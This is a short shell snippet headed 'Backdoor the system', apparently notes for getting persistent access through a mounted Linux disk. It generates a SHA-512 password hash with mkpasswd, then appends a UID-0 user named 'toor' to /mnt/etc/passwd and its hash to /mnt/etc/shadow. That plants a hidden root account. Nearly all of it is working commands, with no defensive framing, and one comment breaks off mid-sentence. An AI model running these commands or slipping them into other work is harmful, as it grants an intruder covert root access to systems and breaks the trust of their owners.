# Backdoor the system:
# Generate a shadow password hash to use:
# mkpasswd is a part of the whois package for some reason...
# The hash type you create is dependent upon 
mkpasswd -m sha-512 -S 12345678 -s <<< password # $6$12345678$I8tr4xFAC6/TtjYWdp0LWEjQre2LcYm2jdSMNLQDIyqRv.cKo7KMD5/HpzVVFKpUQlIekr/Vw.OdImtRM85fg/

# Add user with root priv to system:
echo 'toor:x:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
echo 'toor:$6$12345678$I8tr4xFAC6/TtjYWdp0LWEjQre2LcYm2jdSMNLQDIyqRv.cKo7KMD5/HpzVVFKpUQlIekr/Vw.OdImtRM85fg/:17697:0:99999:7:::' >> /mnt/etc/shadow
